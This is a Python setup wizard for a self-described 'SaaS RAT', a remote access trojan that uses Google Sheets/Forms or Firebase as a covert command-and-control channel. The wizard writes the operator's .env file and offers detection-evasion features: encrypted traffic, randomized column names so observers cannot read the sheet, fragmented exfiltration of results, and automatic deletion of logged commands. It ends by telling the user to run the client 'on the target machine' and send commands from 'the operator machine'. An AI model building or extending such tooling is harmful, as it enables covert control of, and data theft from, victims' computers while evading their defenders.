#!/usr/bin/env python3
"""
setup_wizard.py — interactive setup wizard for SaaS RAT

Usage:
    python setup_wizard.py
"""

import os
import random
import string
import sys


# ── Registries ───────────────────────────────────────────────────────────────
# Add new channel/crypto/fragmenter wizards here as they are implemented.

def _build_registries():
    from wizard.crypto.plaintext import PlaintextWizard
    from wizard.crypto.fernet import FernetWizard
    from wizard.fragmenter.passthrough import PassthroughWizard
    from wizard.fragmenter.fixed import FixedWizard
    from wizard.channel.sheets import SheetsWizard
    from wizard.channel.firebase import FirebaseWizard

    return {
        "crypto": {
            "plaintext": ("No encryption — cleartext values in sheet (debug/demo)", PlaintextWizard),
            "fernet":    ("Fernet encryption — AES + HMAC, recommended for ops use", FernetWizard),
        },
        "fragmenter": {
            "passthrough": ("No fragmentation — result sent in a single write", PassthroughWizard),
            "fixed":       ("Fixed-size chunks — one fragment per poll cycle",   FixedWizard),
        },
        "channel": {
            "sheets":   ("Google Sheets + Forms — C2 traffic via docs.google.com", SheetsWizard),
            "firebase": ("Firebase Realtime Database — C2 traffic via firebaseio.com", FirebaseWizard),
        },
    }


# ── Obfuscation ───────────────────────────────────────────────────────────────

INBOX_FIELDS  = ["command_id", "command", "payload", "target", "status", "created_at"]
OUTBOX_FIELDS = ["command_id", "client_id", "status", "result", "timestamp"]


def _random_name(length=5):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _generate_obfuscation():
    return {
        "inbox":  {f: _random_name() for f in INBOX_FIELDS},
        "outbox": {f: _random_name() for f in OUTBOX_FIELDS},
    }


# ── .env writer ───────────────────────────────────────────────────────────────

_ENV_SECTIONS = [
    ("Google Spreadsheet",     ["SPREADSHEET_ID", "INBOX_GID", "OUTBOX_GID"]),
    ("Google Forms — Outbox",  ["FORMS_URL", "FORMS_FIELD_MAP"]),
    ("Google Forms — Inbox",   ["INBOX_FORMS_URL", "INBOX_FORMS_FIELD_MAP"]),
    ("Encryption",             ["ENCRYPTION_METHOD", "ENCRYPTION_KEY"]),
    ("Column obfuscation",     ["INBOX_COLUMN_MAP", "OUTBOX_COLUMN_MAP"]),
    ("Fragmentation",          ["FRAGMENT_METHOD", "FRAGMENT_CHUNK_SIZE"]),
    ("Sheets cleanup",         ["GOOGLE_SERVICE_ACCOUNT_JSON"]),
    ("OpenAI",                 ["OPENAI_API_KEY"]),
    ("Client",                 ["CLIENT_ID"]),
]


def _write_env(env: dict, path=".env"):
    lines = []
    written = set()

    for title, keys in _ENV_SECTIONS:
        section_lines = [f"{k}={env[k]}" for k in keys if env.get(k)]
        if section_lines:
            lines += [f"# {'─' * 44}", f"# {title}", f"# {'─' * 44}"]
            lines += section_lines
            lines.append("")
            written.update(keys)

    # Any keys not covered by a section
    for k, v in env.items():
        if k not in written and v:
            lines.append(f"{k}={v}")

    with open(path, "w") as f:
        f.write("\n".join(lines).rstrip() + "\n")


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    from wizard import core

    reg = _build_registries()

    # ── Welcome ───────────────────────────────────────────────────────────────
    core.section("Sheets C2 — Setup Wizard")
    core.info("This wizard writes your .env file step by step.")
    core.info("Keep a browser open to Google Sheets and Google Forms — you")
    core.info("will be prompted to create resources and copy values from them.")
    core.info()

    if os.path.exists(".env"):
        core.warn(".env already exists.")
        if not core.ask_yn("Back it up as .env.bak and continue?", default=True):
            core.info("Aborted — existing .env unchanged.")
            sys.exit(0)
        os.rename(".env", ".env.bak")
        core.success("Backed up .env → .env.bak")

    env = {}

    # ── Step 1: Encryption ────────────────────────────────────────────────────
    core.section("Step 1 — Encryption")
    crypto_choice = core.ask_choice(
        "Choose encryption method:",
        {k: label for k, (label, _) in reg["crypto"].items()},
    )
    env.update(reg["crypto"][crypto_choice][1]().setup())
    core.success(f"Encryption: {crypto_choice}")

    # ── Step 2: Column obfuscation ────────────────────────────────────────────
    core.section("Step 2 — Column Obfuscation")
    core.info("Replaces logical column names (command_id, status, etc.) with random")
    core.info("short strings — makes the sheet structure unreadable to an observer.")
    core.info("Set this up before creating the sheet so you use the right names.")
    core.info()

    obfuscation = {}
    if core.ask_yn("Enable column obfuscation?", default=False):
        obfuscation = _generate_obfuscation()
        core.info()
        core.info("Generated column name mapping — use these names in your sheet and forms:")
        core.info()
        core.info("  Inbox columns:")
        for logical, rand in obfuscation["inbox"].items():
            core.info(f"    {logical:<20} →  {rand}")
        core.info()
        core.info("  Outbox columns:")
        for logical, rand in obfuscation["outbox"].items():
            core.info(f"    {logical:<20} →  {rand}")
        core.info()
        core.pause("Take note of these names, then press Enter to continue")
        core.success("Column obfuscation enabled")
    else:
        core.success("Column obfuscation disabled — logical names will be used")

    # ── Step 3: Channel setup ─────────────────────────────────────────────────
    core.section("Step 3 — Channel Setup")
    selected = core.ask_multi(
        "Which channels do you want to configure?",
        {k: label for k, (label, _) in reg["channel"].items()},
    )

    if not selected:
        core.warn("No channels selected — skipping channel setup.")
        core.warn("You will need to set channel env vars manually before running.")
    else:
        for key in selected:
            label, cls = reg["channel"][key]
            core.section(f"Channel — {label}")
            env.update(cls().setup(obfuscation))
            core.success(f"{label} configured")

    # ── Step 4: Fragmentation ─────────────────────────────────────────────────
    core.section("Step 4 — Fragmentation")
    frag_choice = core.ask_choice(
        "Choose fragmentation method:",
        {k: label for k, (label, _) in reg["fragmenter"].items()},
    )
    env.update(reg["fragmenter"][frag_choice][1]().setup())
    core.success(f"Fragmentation: {frag_choice}")

    # ── Step 5: Extras ────────────────────────────────────────────────────────
    core.section("Step 5 — Extras")

    openai_key = core.ask_optional("OpenAI API key (required for: python server.py ai)")
    if openai_key:
        env["OPENAI_API_KEY"] = openai_key
        core.success("OpenAI API key saved")

    client_id = core.ask_optional("Client ID override (default: NADAV)")
    if client_id:
        env["CLIENT_ID"] = client_id
        core.success(f"Client ID: {client_id}")

    if "sheets" in selected:
        core.info()
        core.info("Service account cleanup (optional, Sheets only):")
        core.info("  When set, the server auto-deletes inbox/outbox rows after each")
        core.info("  confirmed result — no manual cleanup script needed.")
        core.info("  Setup: GCP → IAM → Service Accounts → Create → download JSON key")
        core.info("         then share the spreadsheet with the service account email (Editor)")
        sa_path = core.ask_optional("Path to service account JSON key file")
        if sa_path:
            env["GOOGLE_SERVICE_ACCOUNT_JSON"] = sa_path
            core.success("Service account cleanup enabled")

    # ── Step 6: Summary + write ───────────────────────────────────────────────
    core.section("Step 6 — Summary")
    core.info("Values to be written to .env:")
    core.info()
    for k, v in env.items():
        display = v if len(v) <= 60 else v[:57] + "..."
        core.info(f"  {k}={display}")
    core.info()

    if not core.ask_yn("Write .env?", default=True):
        core.warn("Aborted — nothing written.")
        sys.exit(0)

    _write_env(env)
    core.success(".env written")

    # ── Done ──────────────────────────────────────────────────────────────────
    core.section("Done")
    core.info("On the target machine:")
    core.info("  python client.py")
    core.info()
    core.info("On the operator machine:")
    core.info("  python server.py ai")
    core.info("  python server.py send --command system_info")
    core.info()


if __name__ == "__main__":
    main()
